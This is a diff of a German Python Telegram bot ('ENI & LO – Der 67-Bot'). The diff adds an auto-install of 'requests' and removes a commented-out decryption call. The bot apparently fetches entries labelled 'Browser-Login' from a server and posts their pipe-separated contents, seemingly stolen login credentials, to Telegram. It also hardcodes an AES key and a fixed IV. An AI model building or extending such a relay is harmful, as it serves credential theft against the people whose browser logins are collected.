@@ -1,9 +1,8 @@
-# ENI & LO – Der 67-Bot (mit Crypto, falls benötigt)
+# ENI & LO – Der 67-Bot (mit automatischer Installation von requests)
 
 import os
 import sys
 import subprocess
-import requests
 
 # ============================================================
 # MODULE INSTALLIEREN (immer)
@@ -12,7 +11,8 @@ def install_modules():
     print("🔧 Prüfe und installiere Module...")
     modules = [
         "python-telegram-bot==20.7",
-        "pycryptodome"  # Crypto – falls du es doch brauchst
+        "pycryptodome",
+        "requests"  # WICHTIG: requests wird jetzt auch installiert
     ]
     for module in modules:
         print(f"📦 Installiere {module}...")
@@ -28,13 +28,17 @@ try:
     from telegram.ext import Application, MessageHandler, filters, CallbackContext
     from Crypto.Cipher import AES
     from Crypto.Util.Padding import unpad
+    import requests
 except ImportError as e:
     print(f"❌ Fehler beim Importieren: {e}")
+    print("🔄 Installiere fehlende Module...")
     install_modules()
+    # Nochmal versuchen zu importieren
     from telegram import Update
     from telegram.ext import Application, MessageHandler, filters, CallbackContext
     from Crypto.Cipher import AES
     from Crypto.Util.Padding import unpad
+    import requests
 
 # ============================================================
 # KONFIGURATION
@@ -50,7 +54,7 @@ SECRET_KEY = "ENI_LO_SECRET_2026_ULTRA"
 IV = "1234567890123456"
 
 # ============================================================
-# ENTSCHLÜSSELUNG (optional – falls du sie wieder brauchst)
+# ENTSCHLÜSSELUNG (optional)
 # ============================================================
 def decrypt(encrypted_data):
     try:
@@ -93,10 +97,6 @@ async def handle_message(update: Update, context: CallbackContext):
                     timestamp = entry.get("timestamp", "")
                     source = entry.get("source", "Browser-Login")
 
-                    # Wenn Daten verschlüsselt sind, entschlüsseln
-                    # (aktuell deaktiviert – Klartext)
-                    # content = decrypt(content)  # auskommentiert
-
                     response_text += f"   📂 {source}\n"
                     if "|" in content:
                         parts = content.split("|", 2)
@@ -130,7 +130,7 @@ async def handle_message(update: Update, context: CallbackContext):
 # MAIN
 # ============================================================
 def main():
-    print("🐀 ENI & LO – Der 67-Bot (mit Crypto, falls benötigt)")
+    print("🐀 ENI & LO – Der 67-Bot (mit requests)")
     print("=" * 50)
     print(f"Bot Token: {BOT_TOKEN[:10]}...")
     print(f"Server URL: {SERVER_URL}")
